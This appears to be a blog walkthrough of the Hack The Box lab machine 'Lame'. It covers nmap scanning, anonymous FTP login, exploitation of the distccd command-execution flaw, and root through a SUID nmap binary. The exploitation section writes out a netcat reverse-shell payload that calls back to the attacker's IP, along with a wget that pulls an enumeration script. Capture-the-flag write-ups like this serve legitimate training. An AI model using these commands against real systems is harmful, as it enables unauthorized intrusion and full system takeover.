![](http://vedanttare.com/wp-content/uploads/2020/02/Screenshot-2022-09-25-at-2.29.25-PM.png)

**Three phases:**

- **Enumeration**
- **Exploitation**
- **Privilege Escalation**

### Enumeration

Let’s start by doing an nmap scan of the machine:

`nmap -sC -sV -O -oA nmap/lame1000 10.10.10.3`

Output:

![](http://vedanttare.com/wp-content/uploads/2020/02/Screenshot-2021-09-05-at-1.34.32-PM.png)

As we can see that we have the following ports open:

- **21/ftp – vsftpd 2.3.4**
- **22/ssh – OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)**
- **139, 445/smb – netbios-ssn**

The ports of our interest are the 21/ftp and 139, 445/smb ports.

After logging into the ftp server using creds: anonymous/anything (TIP: when anonymous login is allowed, you can use username as anonymous and any password, even a blank password would work), we could find anything that interesting so let’s move on to the next endpoint.

Researching about smb ports of 139 and 445 and their service versions for some vulnerabilities, we couldn’t find anything there either.

Now, doing a full port scan to check for more open ports:

`nmap -sC -sV -p- -oA nmap/lamefull 10.10.10.3`

![](http://vedanttare.com/wp-content/uploads/2020/02/Screenshot-2021-09-05-at-1.50.51-PM.png)

As we can see above, that there is another port open: 3432/disccd

Researching about this port we find out that the service distccd is used for faster compilation, where if a machine is sitting idle, then code from one machine can be sent to it and hence it will compile the code for you, only if this service is present on both hosts.

We could find nmap scripts which would scan for vulnerabilities for this service and we got the following results:

`nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3`

![](http://vedanttare.com/wp-content/uploads/2020/02/Screenshot-2021-09-05-at-4.29.55-PM.png)

As we can see from the image above, that the distccd service is vulnerable to daemon command execution.

### Exploitation

Using the nmap script to run commands:

`nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.7 4444 -e /bin/bash'"`

And setting up a listener on our kali machine to get back a reverse shell:

sudo nc -nlvp 4444

Hence, we get back a reverse shell as user daemon.

### Privilege Escalation

Now transferring over LinEnum.sh to check for malicious information:

`wget http://10.10.14.7/LinEnum.sh`

Running LinEnum.sh we find that the nmap binary has suid enabled. Hence, we can use it to escalate our privileges to root using nmap’s interactive mode to spawn a bash shell!

`sudo nmap --interactive`

`>!sh`

Therefore, we are root!

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Poison](https://vedanttare.com/hackthebox-poison/)

<iframe class="wp-embedded-content" data-secret="TNSIb5Z1Dn" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-poison/embed/#?secret=JH3MaSn6Y1#?secret=TNSIb5Z1Dn" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Poison” — VEDANT TARE" width="600"></iframe></div></figure>
